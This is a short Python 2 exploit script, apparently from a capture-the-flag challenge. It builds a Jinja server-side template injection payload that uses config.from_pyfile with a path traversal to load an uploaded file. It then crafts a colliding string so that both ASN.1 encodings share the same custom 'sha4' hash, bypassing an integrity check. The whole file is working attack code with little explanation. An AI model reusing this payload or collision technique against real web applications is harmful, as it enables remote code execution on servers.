from sha4 import hash
from pyasn1.codec.ber.encoder import encode
from pyasn1.codec.ber.decoder import decode
from pyasn1.type.univ import OctetString

n = 2 # number of extra char added by ASN.1 at the start
content = "a{{config.from_pyfile( \"../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file\") }}aaaa"

# character to replace at their position for collision
replace = {
 '{':'z;[ks\x7fy',
 '}':'|=]muy\x7f',
 '/':".o\x0f?'+-"
}

sevens = [content[i:i+7].ljust(7, "\x00") for i in xrange(0,len(content),7)]
string = ""
for s in sevens:
    for i in xrange(len(s)):
        c = s[i]
        if c in replace:
            string += replace[c][(i+n)%7]
        else:
            string += c

#MEGA FIX
string = string[:-n]

print(repr(content))
print(repr(string))
#'a{{config.from_pyfile( "../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file") }}aaaa'
#'aksconfig.from_pyfile( ".....?tmp.comments\x0fdd31b4dc454c6ec7e01476e02f8eeac4.file") =]aaaa'

asnc = encode(OctetString(content))
asns = encode(OctetString(string))

# (OctetString(tagSet=TagSet((), Tag(tagClass=0, tagFormat=0, tagId=4)), hexValue='616b73636f6e6669672e66726f6d5f707966696c652820222e2e2e2e2e3f746d702e636f6d6d656e74730f64643331623464633435346336656337653031343736653032663865656163342e66696c652229203d5d61616161'), '')
# (OctetString('a{{config.from_pyfile( "../../tmp/comments/dd31b4dc454c6ec7e01476e02f8eeac4.file") }}aaaa', tagSet=TagSet((), Tag(tagClass=0, tagFormat=0, tagId=4))), '')


assert(hash(asnc) == hash(asns))
print("YUP")